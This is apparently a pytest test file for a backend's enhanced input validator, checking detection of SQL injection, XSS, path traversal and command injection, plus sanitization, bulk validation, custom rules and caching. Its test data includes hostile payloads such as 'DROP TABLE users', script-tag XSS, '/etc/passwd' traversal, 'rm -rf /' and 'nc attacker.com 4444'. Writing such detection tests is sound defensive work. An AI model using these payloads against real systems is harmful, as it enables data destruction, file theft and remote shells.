"""
Input Validation Tests
Tests enhanced input validation functionality
"""

import sys
from pathlib import Path
from shared.isolated_environment import IsolatedEnvironment

import pytest

from netra_backend.app.core.enhanced_input_validation import (
    EnhancedInputValidator,
    SecurityThreat,
    ValidationLevel,
)

class TestInputValidation:
    """Test enhanced input validation."""
    
    @pytest.fixture
    def validator(self):
        """Create input validator for testing."""
        return EnhancedInputValidator(ValidationLevel.STRICT)
    
    def test_sql_injection_detection(self, validator):
        """Test SQL injection detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin'/*",
            "UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_input(malicious_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.SQL_INJECTION in result.threats_detected
    
    def test_xss_detection(self, validator):
        """Test XSS detection."""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for xss_input in xss_inputs:
            result = validator.validate_input(xss_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.XSS in result.threats_detected
    
    def test_path_traversal_detection(self, validator):
        """Test path traversal detection."""
        traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for traversal_input in traversal_inputs:
            result = validator.validate_input(traversal_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.PATH_TRAVERSAL in result.threats_detected
    
    def test_command_injection_detection(self, validator):
        """Test command injection detection."""
        command_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test `curl attacker.com`",
            "test $(whoami)"
        ]
        
        for command_input in command_inputs:
            result = validator.validate_input(command_input, "test_field")
            assert not result.is_valid
            assert SecurityThreat.COMMAND_INJECTION in result.threats_detected
    
    def test_input_sanitization(self, validator):
        """Test input sanitization."""
        malicious_input = "<script>alert('xss')</script>"
        result = validator.validate_input(malicious_input, "test_field")
        
        # Should be sanitized even if invalid
        assert result.sanitized_value != malicious_input
        assert "<script>" not in result.sanitized_value
    
    def test_context_validation(self, validator):
        """Test context-specific validation."""
        # Email validation
        email_result = validator.validate_input(
            "invalid-email", 
            "email_field", 
            {"type": "email"}
        )
        assert "email" in email_result.warnings[0].lower()
        
        # URL validation
        url_result = validator.validate_input(
            "javascript:alert('xss')", 
            "url_field", 
            {"type": "url"}
        )
        assert not url_result.is_valid
        
        # Filename validation
        filename_result = validator.validate_input(
            "../../../etc/passwd", 
            "filename_field", 
            {"type": "filename"}
        )
        assert not filename_result.is_valid
    
    def test_validation_levels(self):
        """Test different validation levels."""
        # Strict validator
        strict_validator = EnhancedInputValidator(ValidationLevel.STRICT)
        result = strict_validator.validate_input("<b>bold</b>", "content")
        assert not result.is_valid  # Should reject HTML
        
        # Permissive validator
        permissive_validator = EnhancedInputValidator(ValidationLevel.PERMISSIVE)
        result = permissive_validator.validate_input("<b>bold</b>", "content")
        assert result.is_valid  # Should allow safe HTML
    
    def test_bulk_validation(self, validator):
        """Test bulk input validation."""
        inputs = {
            "username": "valid_user",
            "email": "user@example.com",
            "password": "secure_password123",
            "malicious": "'; DROP TABLE users; --"
        }
        
        results = validator.bulk_validate(inputs)
        
        assert results["username"].is_valid
        assert results["email"].is_valid
        assert results["password"].is_valid
        assert not results["malicious"].is_valid
    
    def test_custom_validation_rules(self, validator):
        """Test custom validation rules."""
        # Add custom rule
        def no_profanity(text):
            forbidden_words = ["badword1", "badword2"]
            return not any(word in text.lower() for word in forbidden_words)
        
        validator.add_custom_rule("profanity_filter", no_profanity)
        
        # Test custom rule
        result = validator.validate_input("This contains badword1", "comment")
        assert not result.is_valid
    
    def test_validation_caching(self, validator):
        """Test validation result caching."""
        # Enable caching
        validator.enable_caching = True
        
        # First validation
        input_text = "safe input text"
        result1 = validator.validate_input(input_text, "test_field")
        
        # Second validation should use cache
        result2 = validator.validate_input(input_text, "test_field")
        
        assert result1.is_valid == result2.is_valid
        assert result1.from_cache != result2.from_cache  # Second should be from cache

if __name__ == "__main__":
    pytest.main([__file__, "-v"])